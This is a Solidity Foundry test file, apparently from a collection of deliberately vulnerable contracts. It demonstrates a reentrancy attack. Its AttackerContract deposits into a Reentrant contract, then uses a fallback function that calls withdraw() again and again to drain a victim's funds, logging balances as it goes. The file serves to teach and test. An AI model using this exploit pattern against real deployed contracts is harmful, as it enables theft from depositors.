// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.11;

import "forge-std/Test.sol";
import "../../src/Vulns/Reentrant.sol";

contract ReentrantTest is Test {
    Reentrant public reentrant;
    AttackerContract attack;
    address victim = vm.addr(2);
    address attacker = vm.addr(3);

    function setUp() public {
        reentrant = new Reentrant();
        attack = new AttackerContract(address(reentrant));
        vm.deal(address(reentrant), 10 ether);
        vm.deal(address(attack), 5 ether);
        vm.deal(address(victim),5 ether);
        vm.prank(victim);
        reentrant.deposit{value: 5 ether}();
    }
    function testReentrancy() public {
        attack.Attack();
    }
}

contract AttackerContract is DSTest{
   Reentrant reentrant;
    constructor(address _reentrant) public {
        reentrant = Reentrant(_reentrant);
    }


    function Attack() public {   
        emit log_named_decimal_uint("Start attack, reentrant balance", address(reentrant).balance, 18);
        reentrant.deposit{value: 1 ether}();  
        emit log_named_decimal_uint("Deposited 1 Ether, reentrant balance", address(reentrant).balance, 18);
        emit log_string("==================== Start of attack ====================");
        reentrant.withdraw(1 ether); 
        emit log_string("==================== End of attack ====================");
        emit log_named_decimal_uint("End of attack, reentrant balance:", address(reentrant).balance, 18);
        emit log_named_decimal_uint("End of attack, reentrant balance:", address(this).balance, 18);
    }

    fallback() external payable {
        emit log_named_decimal_uint("reentrant balance", address(reentrant).balance, 18);
        emit log_named_decimal_uint("Attacker balance", address(this).balance, 18);
        if (address(reentrant).balance >= 1 ether) {
            emit log_string("Reenter");
            reentrant.withdraw(1 ether);
        }
    }

}

